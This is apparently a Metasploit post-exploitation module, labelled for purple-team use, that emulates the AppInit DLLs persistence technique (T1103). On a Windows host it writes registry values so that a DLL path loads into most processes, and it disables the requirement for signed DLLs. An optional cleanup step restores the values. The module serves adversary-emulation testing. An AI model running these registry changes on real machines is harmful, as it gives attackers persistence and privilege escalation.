##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Exploit::FileDropper
  include Msf::Post::Windows::Priv

  def initialize(info={})
    super(update_info(info,
        'Name'          => 'AppInit DLLs (T1103) Windows - Purple Team',
        'Description'   => %q{
            Persistence, Privilege Escalation:
            Dynamic-link libraries (DLLs) that are specified in the AppInit_DLLs value in the Registry keys HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows or HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. Similar to Process Injection, these values can be abused to obtain persistence and privilege escalation by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. The AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Praetorian' ],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
      [
        OptBool.new('CLEANUP', [false, 'Delete registry changes after execution', true])
      ])
  end


  # TODO upload a dll to use and test
  def run
    begin
      raise "Module requires meterpreter session" unless session.type == "meterpreter"
      raise "Requires Admin" unless is_admin?

      base_key = "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\"

      registry_setvaldata(base_key, "AppInit_DLLs", "C:\\t1103.dll", "REG_SZ")
      print_good("set #{base_key}AppInit_DLLs to \"#{registry_getvaldata(base_key, "AppInit_DLLs")}\"")
      registry_setvaldata(base_key, "LoadAppInit_DLLs", 1, "REG_DWORD")
      print_good("set #{base_key}LoadAppInit_DLLs to \"#{registry_getvaldata(base_key, "LoadAppInit_DLLs")}\"")
      registry_setvaldata(base_key, "RequireSignedAppInit_DLLs", 0, "REG_DWORD")
      print_good("set #{base_key}RequireSignedAppInit_DLLs to \"#{registry_getvaldata(base_key, "RequireSignedAppInit_DLLs")}\"")

      if datastore['CLEANUP']
        print_warning("Cleaning up. This will remove the registry change")
        registry_setvaldata(base_key, "AppInit_DLLs", "", "REG_SZ")
        print_good("set #{base_key}AppInit_DLLs to \"#{registry_getvaldata(base_key, "AppInit_DLLs")}\"")
        registry_setvaldata(base_key, "LoadAppInit_DLLs", 0, "REG_DWORD")
        print_good("set #{base_key}LoadAppInit_DLLs to \"#{registry_getvaldata(base_key, "LoadAppInit_DLLs")}\"")
        registry_setvaldata(base_key, "RequireSignedAppInit_DLLs", 1, "REG_DWORD")
        print_good("set #{base_key}RequireSignedAppInit_DLLs to \"#{registry_getvaldata(base_key, "RequireSignedAppInit_DLLs")}\"")
      end

    rescue ::Exception => e
      print_error("#{e.class}: #{e.message}")
      print_error("Module T1103 execution failed.")
    end
  end
end
